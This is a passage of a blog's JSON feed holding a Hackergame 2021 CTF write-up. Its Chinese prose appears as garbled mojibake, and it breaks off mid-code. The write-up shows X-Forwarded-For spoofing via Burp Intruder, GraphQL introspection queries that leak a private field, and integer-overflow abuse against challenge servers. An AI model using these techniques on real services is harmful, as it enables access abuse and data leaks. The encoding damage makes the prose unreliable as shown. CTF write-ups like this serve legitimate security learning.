R4qoKdqBsEAbGBfjnNMiSwqp&#x2F;pdZIvF0LtjzRxgD5&#x2F;BOvxZtq9zpu8WTP+InLqLtMkXXffeNwM7fKFvfb3RNQfXMPa8wNMLD80D3NyeVEJBZ3AZzhEKaruVZMfhbS&#x2F;Nmcec9GF2nWQm2L8+qLxWbi0OM1lXBuCvMZ5DU8u5tr12a&#x2F;vTwM0CP4gZ0ga9TSNVb2vfJdtHDuC9BSlTB7KcA&#x2F;&#x2F;xvozzLKhfZEUQvmOoyxtzthFSf&#x2F;b3KhAUgu5GzrMSPPiEGNFIWbqm0UF9j5GStLEXm9fOuFvefZw5mH5q0zoIr4cbLFjRjE67EkG0riIEpGjoSG5c3GTsALEhfkv2VpxhSbtucDmKnftpHxYZQcJ+Atg9MnlcZ2mLE2wi8TqJ&#x2F;Y8ODehHR6ocioUPGxZJblrquxAjAARnsqNZ1eIJIO2vOH83HUg0zGhfq4ag4DEEwIxczSRqNnMSuSta+O80zpla9CVaDwcLUG7KMyu0pTrwSLtuGgSa14iE+SQza7jIJs8PTwwRMb7N89oOaXs3QWsmlSybak0pgJ+pZLCiPQYHgD91kaTCRDOOz2sX1F4FSe4OP8ehuEH5vVhcg2&#x2F;FRn0w5AfPRhz30XstZkZrJzYWLNLcB1uPC1bR5YD44AgaRPWQQmLdkmRj8ea5siGd3aDEPDAfNUUatAzwBsfZKZUis2P5LbAJpTjbxbQ9&#x2F;Y8b9aqafukEV3Vs23IEyTx4uRWGUqbpP&#x2F;e9vr6gFGcjM80TkKrsoiG6CuySRQUnUPGAmco8TZwI1ETwthdL5Xh2D82vI1Q93Lh1n194uCSLKPbVIFgxONJIKyIJFfAU&#x2F;kP9Beqb+oLoBulIbDeechaTNfe8RrzZM&#x3D;</p>\n",
            "tags": [
                "Write-Up",
                "SchoolBus"
            ]
        },
        {
            "id": "http://cubicy.icu/2021/10/30/Hackergame2021%20%E9%83%A8%E5%88%86WriteUp/",
            "url": "http://cubicy.icu/2021/10/30/Hackergame2021%20%E9%83%A8%E5%88%86WriteUp/",
            "title": "Hackergame2021 éƒ¨åˆ†WriteUp",
            "date_published": "2021-10-30T08:11:00.000Z",
            "content_html": "<h1 id=\"WriteUp-by-YYY\"><a href=\"#WriteUp-by-YYY\" class=\"headerlink\" title=\"WriteUp by YYY\"></a>WriteUp by YYY</h1><hr>\n<h2 id=\"ä¸€ç‚¹ç¢ç¢å¿µ\"><a href=\"#ä¸€ç‚¹ç¢ç¢å¿µ\" class=\"headerlink\" title=\"ä¸€ç‚¹ç¢ç¢å¿µ\"></a>ä¸€ç‚¹ç¢ç¢å¿µ</h2><p>è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€æ¬¡Hackergame&#x2F;CTFæ¯”èµ›ï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€ã€‚å‰å‡ å¤©å¿ƒæ€æœ‰ç‚¹å´©ï¼Œå¥½åœ¨è°ƒæ•´è¿‡æ¥äº†ã€‚å¤§å®¶è¿˜æ˜¯è¦æŠŠHackergameå½“åšgameã€‚æœ€å¼€å¿ƒçš„æ˜¯è®¤è¯†äº†å¥½å¤šå¤§ä½¬ï¼ŒæŠ±å¤§è…¿.jpg  </p>\n<p><img src=\"https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030161203937-1693462675.png\" alt=\"emoji\" loading=\"lazy\"></p>\n<p>å¯¹è‡ªå·±çš„åæ§½ï¼šEasyRSAå·®ç‚¹åšå‡ºæ¥ï¼Œæ‰©å±•æ¬§å‡ é‡Œå¾—å†™é”™å¼ƒç–—äº†ï¼›RAID0å¡åœ¨è½¯ä»¶æ²¡æœ‰æ¿€æ´»ç ä¸è®©ä¿å­˜ï¼›å’Œå„ç§å°æµ‹æ’ï¼›å„ç§ä½“è°ƒä¸è‰¯ï¼Œé¥®é£Ÿç¡çœ ä¸ä½³ï¼›æ™šä¸Šå­¦æ ¡æ–­ç”µæ²¡æ³•åšï¼Œæˆ‘åˆæ˜¯å¤§å¤œçŒ«å­â€¦â€¦å¥‡å¥‡æ€ªæ€ªæŒ¡è·¯çš„ä¸œè¥¿ä¸€ç›´ä¸å°‘ï¼Œå½’æ ¹ç»“åº•è¿˜æ˜¯å¤ªèœäº†å•¦ã€‚<br>æ€»ä¹‹éå¸¸æ„Ÿè°¢@TonyCraneå¤§ä½¬ã€GodSpeedå¤§ä½¬åŠç¾¤å†…å„æˆå‘˜çš„é¼“åŠ±æ”¯æŒå¸®åŠ©ï¼ˆè†œä¸ç®—ï¼‰ã€‚<br>å¸Œæœ›æˆ‘èƒ½æ—©æ—¥å­¦ä¼šbinaryå’Œmathã€‚  </p>\n<hr>\n<h2 id=\"ç­¾åˆ°\"><a href=\"#ç­¾åˆ°\" class=\"headerlink\" title=\"ç­¾åˆ°\"></a>ç­¾åˆ°</h2><p>è¿™é¢˜äºŒåˆ†ä¸€ä¸‹pageå‚æ•°å³å¯ã€‚<br><del>é¼ æ ‡è¿ç‚¹å™¨</del>  </p>\n<hr>\n<h2 id=\"è¿›åˆ¶åå…­â€”â€”å‚ä¸Š\"><a href=\"#è¿›åˆ¶åå…­â€”â€”å‚ä¸Š\" class=\"headerlink\" title=\"è¿›åˆ¶åå…­â€”â€”å‚ä¸Š\"></a>è¿›åˆ¶åå…­â€”â€”å‚ä¸Š</h2><p>ä½¿ç”¨Hex Editor Neoç›´æ¥æ–°å»ºæ–‡ä»¶æŠ„å†™å³å¯ã€‚å½“ç„¶OCRè¯†åˆ«ä¹Ÿè¡Œå§ã€‚</p>\n<hr>\n<h2 id=\"å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢\"><a href=\"#å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢\" class=\"headerlink\" title=\"å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢\"></a>å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢</h2><p>ä¸‹è½½éŸ³é¢‘åå¯ä»¥å¬å‡ºæ˜¯ä¸€æ®µäººå£°ï¼Œä½†æ˜¯è¯­é€Ÿæå¿«ã€‚äºæ˜¯ä½¿ç”¨Adobe Audition CCæ‰“å¼€ï¼Œæ•ˆæœ-&gt;ä¼¸ç¼©ä¸å˜è°ƒæ”¾æ…¢é€Ÿåº¦ï¼Œé€‚å½“è°ƒèŠ‚éŸ³é«˜å°±èƒ½å¼€å§‹å¬å†™äº†ã€‚å¯ä»¥å‘ç°è¿™æ˜¯<strong>NATO Phonetic Alphabet</strong>ï¼š</p>\n<blockquote>\n<p>A ALPHA<br>B BRAVO<br>C CHARLIE<br>D DELTA<br>E ECHO<br>F FOXTROT<br>G GOLF<br>H HOTEL<br>I INDIA<br>J JULIET<br>K KILO<br>L LIMA<br>M MIKE<br>N NOVEMBER<br>O OSCAR<br>P PAPA<br>Q QUEBEC<br>R ROMEO<br>S SIERRA<br>T TANGO<br>U UNIFORM<br>V VICTOR<br>W WHISKEY<br>X X-RAY<br>Y YANKEE<br>Z ZULU  </p>\n</blockquote>\n<hr>\n<h2 id=\"çŒ«å’ªé—®ç­”-Pro-Max\"><a href=\"#çŒ«å’ªé—®ç­”-Pro-Max\" class=\"headerlink\" title=\"çŒ«å’ªé—®ç­” Pro Max\"></a>çŒ«å’ªé—®ç­” Pro Max</h2><p>GeneralÃ— æ‚æŠ€âˆš  </p>\n<ol>\n<li><p><a href=\"http://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes\">ç»å…¸WebArchive</a> ç¬¬ä¸€è¡Œå°±æœ‰ç­”æ¡ˆ:20150504</p>\n</li>\n<li><p><a href=\"https://lug.ustc.edu.cn/wiki/intro/\">https://lug.ustc.edu.cn/wiki/intro/</a>  </p>\n<blockquote>\n<p>æ­¤å¤„èµ„æ–™æ˜¾ç¤ºæ˜¯4æ¬¡ï¼Œä½†å¹¶éæœ€æ–°ï¼Œæˆ‘åæ¥æ‰‹åŠ¨å°è¯•æ‰å¾—çŸ¥æ˜¯5</p>\n</blockquote>\n</li>\n<li><p><a href=\"https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2016.06.16_%E6%B4%BB%E5%8A%A8%E5%AE%A4%E6%90%AC%E8%BF%81/IMG_20160616_133655.jpg\">FTPæœåŠ¡å™¨</a> Obviouslyï¼Œç­”æ¡ˆæ˜¯Development Team of Library <del>åæ¥å¾—çŸ¥ç½‘ç«™é¦–é¡µnewså¤´å›¾å°±æœ‰ï¼Œæˆ‘è¿˜æ‰¾äº†å¥½ä¹…</del></p>\n</li>\n<li><p>è°·æ­Œå…³é”®è¯<code>SIGBOVIK2021</code> <code>Newcomb-Benford</code>ç›´æ¥å°±èƒ½æ‰¾åˆ°åŸè®ºæ–‡<a href=\"http://sigbovik.org/2021/proceedings.pdf\">http://sigbovik.org/2021/proceedings.pdf</a> ç›´æ¥<code>Ctrl+F</code>æ‰¾åˆ°æ–‡ç« ï¼Œå‘ç°æœ‰14ä¸ªFiguresï¼Œæ’é™¤ç¬¬ä¸€ä¸ªåœ¨Backgroundé‡Œçš„Figureåå¾—åˆ°ç­”æ¡ˆä¸º13</p>\n</li>\n<li><p>è°·æ­Œå…³é”®è¯<code>protocol</code> <code>report</code> æ‰¾åˆ°<a href=\"https://www.rfc-editor.org/rfc/rfc8962.html\">https://www.rfc-editor.org/rfc/rfc8962.html</a></p>\n</li>\n</ol>\n<blockquote>\n<p>6.Reporting Offenses<br>Send all your reports of possible violations and all tips about wrongdoing to <strong>&#x2F;dev&#x2F;null</strong>. The Protocol Police are listening and will take care of it.</p>\n</blockquote>\n<p><del>è¿˜æŒºå¹½é»˜ï¼Œä¸€å¼€å§‹è¿˜çœŸä»¥ä¸ºæœ‰policeåœ¨listening</del></p>\n<hr>\n<h2 id=\"å–ç“œ\"><a href=\"#å–ç“œ\" class=\"headerlink\" title=\"å–ç“œ\"></a>å–ç“œ</h2><p>20ä¸æ˜¯3çš„å€æ•°ï¼Œä¹çœ‹ä¼¼ä¹ä¸å¯èƒ½ç”¨6å’Œ9åŠ å’Œå¾—åˆ°ã€‚ä½†éšä¾¿è¯•äº†è¯•ï¼Œå‘ç°9æ–¤çš„ç“œå¾ˆå¤šå¾ˆå¤šæ—¶ä¼šæº¢å‡ºä¸º-9223372036854775808ï¼Œæ®æ­¤åˆ¤æ–­ä¸ºint64æº¢å‡ºï¼Œåˆ¤æ–­åº”å½“åœ¨æ­¤å¤„åŠ ä»¥åˆ©ç”¨ã€‚<br>æˆ‘ä»¬éœ€è¦è®©è¿™ä¸ªæ•°å­—ç¨å¾®æº¢å‡ºä¸€ç‚¹ï¼Œä¸èƒ½æº¢å‡ºå¤ªå¤šã€‚ä¹Ÿå°±æ˜¯ç•¥å¤§äºfloor(9223372036854775808&#x2F;9)ï¼Œä½¿å¾—æº¢å‡ºä¸º-9223372036854775808ä»¥å¤–çš„æ•°å­—ï¼Œå¹¶ä¸”è®©è¯¥æ•°å­—åˆ°20çš„è·ç¦»èƒ½è¢«3æ•´é™¤ã€‚ä¹‹åç›´æ¥åŠ å›20å°±è¡Œï¼ˆç®€å•å°å­¦(?)ç®—æ•°ï¼Œå±¡æœ‰å³å°†åšå‡ºæ¥æ—¶åŠ è¿‡å¤´è¶…è¿‡20çš„æƒ¨å‰§hhhï¼‰<br>çµæ„Ÿæ¥æºï¼š<a href=\"https://www.bbsmax.com/A/pRdByjq65n/\">CTF ä¸¤é“webæ•´æ•°æº¢å‡ºé¢˜ç›®(çŒ«å’ªé“¶è¡Œå’Œltshop)</a>  </p>\n<hr>\n<h2 id=\"é€æ˜çš„æ–‡ä»¶\"><a href=\"#é€æ˜çš„æ–‡ä»¶\" class=\"headerlink\" title=\"é€æ˜çš„æ–‡ä»¶\"></a>é€æ˜çš„æ–‡ä»¶</h2><p>æ ¹æ®é¢˜é¢å’Œæ–‡ä»¶ä¼šå‘ç°è¿™æ˜¯ç»ˆç«¯çš„é¢œè‰²ä»£ç ï¼Œç½‘ç»œæœç´¢ç»ˆç«¯é¢œè‰²ä»£ç æ ¼å¼åå°†æ‰€æœ‰<code>[</code>å‰è¡¥ä¸Šä¸€ä¸ª<code>\\e</code>ï¼Œç„¶å<code>echo -e &quot;&#123;å†…å®¹&#125;&quot;</code>å°±è¡Œå•¦ã€‚è®°å¾—æ‰§è¡Œå‰æŠŠç»ˆç«¯å…ˆç”¨å­—ç¬¦å¡«æ»¡ï¼Œä¸ç„¶å¯èƒ½ç”»ä¸å®Œæ•´ã€‚<br><img src=\"https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030154901529-149476643.jpg\" alt=\"chars\" loading=\"lazy\"></p>\n<hr>\n<h2 id=\"æ—…è¡Œç…§ç‰‡\"><a href=\"#æ—…è¡Œç…§ç‰‡\" class=\"headerlink\" title=\"æ—…è¡Œç…§ç‰‡\"></a>æ—…è¡Œç…§ç‰‡</h2><p><del>ç®€ç®€å•å•å¼€ä¸ªç›’</del><br>æ—…æ¸¸ï¼Œæµ·æ»©ï¼Œæ±‰å­—ï¼Œè¯´æ˜è¿™æ˜¯å›½å†…ä¸€ä¸ªæµ·è¾¹æ—…æ¸¸æ™¯ç‚¹ã€‚<br>è“è‰²KFCï¼Ÿè¿™å¯ä¸å¸¸è§ï¼Œåº”è¯¥æœ‰ä¸å°‘äººæ‰“å¡äº†å§ã€‚<br>ç™¾åº¦æœç´¢<code>è“è‰²KFC</code>ï¼Œç¬¬ä¸€é¡¹å°±æ˜¯æŸçº¢ä¹¦çš„<code>ç§¦çš‡å²›è’‚å‡¡å°¼è“ç§¦çš‡å²›ç½‘çº¢æ‰“å¡|å›½å†…å”¯ä¸€è’‚èŠ™å°¼è“è‰²è‚¯å¾·åŸº</code><br>ç™¾åº¦åœ°å›¾å®šä½å‘ç°è¿™å®¶åº—æ˜¯æŸæµ·åº•ä¸–ç•Œåˆ†åº—ï¼Œç›´æ¥å¾—åˆ°ç”µè¯å·ç ã€‚<br><a href=\"https://www.earthol.org/\">https://www.earthol.org/</a>ä¸Šé€šè¿‡è¡—æ™¯å‘ç°ä¸‰ä¸ªæ±‰å­—â€œæµ·|è±š|é¦†â€<br><img src=\"https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030154657507-2019993326.jpg\" alt=\"building\" loading=\"lazy\"></p>\n<p>å¯¹ç…§åœ°å›¾ï¼Œè§†çº¿å’Œæµ·å²¸çº¿å¤§çº¦æˆ45Â°ï¼Œæ¨æµ‹åº”å½“åœ¨ä¸œå—æ–¹å‘ã€‚è¿›è€Œå‘ç°å½±å­è¥¿æ–œï¼Œåº”å½“åœ¨ä¸‹åˆ&#x2F;å‚æ™š<br>é€šè¿‡ç»˜åˆ¶å„ä¸ªæ°´å¹³çº¿æ‰¾å‡ºç­ç‚¹å¯ä»¥æ¨æµ‹æ¥¼å±‚ï¼ˆçŸ¥ä¹æœ‰äº›æ–‡ç« æœ‰è¯¦ç»†è¯´æ˜ï¼‰ã€‚æˆ‘çš„æ–¹æ³•æ˜¯æ‰¾åˆ°å¯¹é¢æ¥¼â€œæœ€çŸ©å½¢â€å˜å½¢æœ€å°‘çš„çª—æˆ·åˆ¤æ–­ä¸ºåŒä¸€æ¥¼å±‚ï¼Œç„¶åæ•°ï¼Œå‘ç°æ˜¯13å±‚å·¦å³ï¼ˆç»å°è¯•å‘ç°æ˜¯14å±‚ï¼‰</p>\n<hr>\n<h2 id=\"FLAGåŠ©åŠ›å¤§çº¢åŒ…\"><a href=\"#FLAGåŠ©åŠ›å¤§çº¢åŒ…\" class=\"headerlink\" title=\"FLAGåŠ©åŠ›å¤§çº¢åŒ…\"></a>FLAGåŠ©åŠ›å¤§çº¢åŒ…</h2><p>æ—¢ç„¶æ˜¯å’Œipæœ‰å…³ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„å°±æ˜¯<code>X-Forwarded-For</code>ï¼Œæœç„¶æˆåŠŸäº†ã€‚å› ä¸ºæ¯ä¸ª<code>/8</code>ipæ®µï¼ˆä¹Ÿå°±æ˜¯ä¾‹å¦‚255.0.0.0-255.255.255.255ï¼‰éƒ½åªèƒ½ç®—ä¸€æ¬¡ï¼Œæˆ‘ä»¬ä½¿ç”¨BurpSuiteçš„Intruderï¼Œå°†Postæ•°æ®ä¸­çš„ipå’Œ<code>X-Forwarded-For</code>çš„ipé¦–æ®µæ‰“ä¸Šæ ‡è®°ï¼Œé€‰æ‹©<code>Battering Ram</code>æ¨¡å¼ï¼ˆè®©ä¸¤å¤„å‚æ•°ä¸€è‡´ï¼‰ï¼Œæ„é€ 0~255çš„å­—å…¸ï¼Œè‡ªåŠ¨åŒ–è®¿é—®<code>0.114.114.114</code>ã€<code>1.114.114.114</code>ã€<code>2.114.114.114</code>â€¦â€¦<code>255.114.114.114</code>è¾¾æˆåˆšå¥½256ä¸ªåŠ©åŠ›è·å¾—flagã€‚ç”±äºæ¯æ¬¡é—´éš”2sï¼Œ2s*256&#x3D;512sï¼Œå°äºé¢˜ç›®æ—¶é•¿é™åˆ¶10min&#x3D;600sæ‰€ä»¥æ˜¯å¯è¡Œçš„ã€‚</p>\n<hr>\n<h2 id=\"Amnesia-è½»åº¦å¤±å¿†\"><a href=\"#Amnesia-è½»åº¦å¤±å¿†\" class=\"headerlink\" title=\"Amnesia-è½»åº¦å¤±å¿†\"></a>Amnesia-è½»åº¦å¤±å¿†</h2><p>ç›´æ¥<code>putchar()</code>é€ä¸ªæ‰“å°ç»•è¿‡å³å¯ã€‚</p>\n<hr>\n<h2 id=\"å›¾ä¹‹ä¸Šçš„ä¿¡æ¯\"><a href=\"#å›¾ä¹‹ä¸Šçš„ä¿¡æ¯\" class=\"headerlink\" title=\"å›¾ä¹‹ä¸Šçš„ä¿¡æ¯\"></a>å›¾ä¹‹ä¸Šçš„ä¿¡æ¯</h2><p>GraphQLçš„åˆ©ç”¨ã€‚è®¿é—®<code>/graphql?query=&#123;&#125;</code>å‘ç°å­˜åœ¨åˆ©ç”¨å¯èƒ½ã€‚æŸ¥é˜…<a href=\"https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ\">èµ„æ–™</a>åå¾—çŸ¥å¯ä»¥åˆ©ç”¨å†…çœæ³¨å…¥ã€‚æ²¡æœ‰UIç•Œé¢æˆ‘ç›´æ¥åœ°å€æ è¾“å…¥ã€‚æ¢è¡Œæ›¿æ¢ä¸º<code>%0A</code>åï¼Œè®¿é—®<code>/graphql?query=&#123;__schema%0A&#123;types%0A&#123;name&#125;&#125;&#125;</code>å¾—åˆ°ï¼š</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;data&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;__schema&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;types&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">[</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;Query&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;GNote&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;Int&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;String&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;GUser&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;Boolean&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__Schema&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__Type&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__TypeKind&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__Field&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__InputValue&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__EnumValue&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__Directive&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__DirectiveLocation&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">]</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>å‘ç°æœ‰ä¸ª<code>GUser</code>ç±»å‹ã€‚æ¥ä¸‹æ¥è®¿é—®<code>/graphql?query=&#123;__type(name:&quot;GUser&quot;)&#123;name%0Afields&#123;name%0Atype&#123;name,kind&#125;&#125;&#125;&#125;</code>çˆ†å‡ºå­—æ®µå<code>privateEmail</code>ï¼Œç„¶åç›´æ¥<code>/graphql?query=&#123;user(id:1)&#123;id,privateEmail&#125;&#125;</code>å¾—åˆ°flag.</p>\n<hr>\n<h2 id=\"èµ›åšå¨æˆ¿\"><a href=\"#èµ›åšå¨æˆ¿\" class=\"headerlink\" title=\"èµ›åšå¨æˆ¿\"></a>èµ›åšå¨æˆ¿</h2><ul>\n<li>Level0ï¼šç›´æ¥å†™</li>\n<li>Level1ï¼šå¤åˆ¶ç²˜è´´å‘ç°æœ‰é•¿åº¦é™åˆ¶ gotoä¼˜åŒ–è¡Œæ•°<br> ç„¶åä¸ä¼šäº†ã€‚</li>\n</ul>\n<hr>\n<h2 id=\"é˜µåˆ—æ¢å¤å¤§å¸ˆ-RAID5\"><a href=\"#é˜µåˆ—æ¢å¤å¤§å¸ˆ-RAID5\" class=\"headerlink\" title=\"é˜µåˆ—æ¢å¤å¤§å¸ˆ-RAID5\"></a>é˜µåˆ—æ¢å¤å¤§å¸ˆ-RAID5</h2><p>ç›´æ¥ä¸¢è¿›RAID Reconstructor 5é‡Œé¢è·‘å¾—åˆ°é•œåƒæ–‡ä»¶ã€‚Windowsä¸Šå¹¶æ²¡æ³•ç›´æ¥è¯»ï¼Œäºæ˜¯ä¸¢è¿›Diskinternals Linux Readeré‡Œè¯»æ–‡ä»¶å¯¼å‡ºã€‚æ‰§è¡Œgetflag.pyå´æç¤º<code>Did you recover my data correctly?</code>ï¼Œç–‘æƒ‘ä¹‹ä¸‹æ¢WSL(Kali Linux)æ‰§è¡Œå°±æˆåŠŸäº†ã€‚<br><del>åæ§½ï¼šRAID0çš„XFSéœ€è¦æ³¨å†Œç æ²¡æ³•æã€‚WSLä¹Ÿmountä¸ä¸Šï¼Œçœ‹æ¥è¿˜æ˜¯è™šæ‹Ÿæœºé è°±ã€‚</del></p>\n<hr>\n<h2 id=\"åŠ©è®°è¯-ç¬¬ä¸€é¡¿å¤§é¤\"><a href=\"#åŠ©è®°è¯-ç¬¬ä¸€é¡¿å¤§é¤\" class=\"headerlink\" title=\"åŠ©è®°è¯-ç¬¬ä¸€é¡¿å¤§é¤\"></a>åŠ©è®°è¯-ç¬¬ä¸€é¡¿å¤§é¤</h2><p>ä»£ç å®¡è®¡åå‘ç°ç›®çš„æ˜¯å»¶è¿Ÿå°½å¯èƒ½é«˜ã€‚ç”¨BurpSuiteæ”¹åŒ…åœ¨POSTæ•°æ®é‡Œå¤åˆ¶å‡ºæ¥å¾ˆå¤šè¡Œæ³¨è®°è¯æäº¤å°±æœ‰äº†flag1ã€‚å°±åƒè¿™æ ·ï¼š  </p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">[</span></span><br><span class=\"line\">    <span class=\"string\">&quot;necessary science growth addition&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"string\">&quot;necessary science growth addition&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    ï¼ˆé‡å¤å¥½å¤šå¥½å¤šæ¬¡ï¼‰</span><br><span class=\"line\">    <span class=\"string\">&quot;necessary science growth addition&quot;</span></span><br><span class=\"line\"><span class=\"punctuation\">]</span></span><br></pre></td></tr></table></figure>\n\n<p>å¦‚æœä¸è¡ŒCLEARå†è¯•è¯•ã€‚<br><img src=\"https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030155443141-1922071122.jpg\" alt=\"clear it\" loading=\"lazy\"></p>\n<p>å°å‘ï¼štokenè¦è·Ÿä¸Šæ‰èƒ½æ‹¿åˆ°flagï¼Œä¸è¿‡æœ‰æ—¶è‡ªåŠ¨è·å–çš„tokenæ— æ•ˆï¼Œä½¿å¾—flagåªæ˜¾ç¤ºä¸ºtrueï¼Œå› ä¸ºåŠ å·æ²¡æœ‰URLEncodeè½¬ä¹‰ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯bug.  </p>\n<hr>\n<h2 id=\"é©¬èµ›å…‹\"><a href=\"#é©¬èµ›å…‹\" class=\"headerlink\" title=\"é©¬èµ›å…‹\"></a>é©¬èµ›å…‹</h2><p>æ¨¡æ‹Ÿé¢˜ã€‚å¤§æ¦‚æ€è·¯æ˜¯å…ˆæ‰«ä¸€éï¼ŒæŠŠèƒ½ç¡®å®šçš„å…ˆç¡®å®šä¸‹æ¥ã€‚ä¹‹åå†dfså‰©ä¸‹çš„å—ï¼ˆä¸éœ€è¦å…¨éƒ¨æ±‚å‡ºï¼Œæ¯•ç«Ÿè¿™é¢˜çš„äºŒç»´ç çº é”™æ‹‰æ»¡äº†ï¼‰ã€‚<br>ä»£ç å¾ˆä¸‘å¯¹å§QAQï¼ˆå½“æ—¶ä¸ç†Ÿæ‚‰ndarrayæ“ä½œï¼Œå…¨éƒ¨å½“åšliståšä¸€éï¼‰  </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span 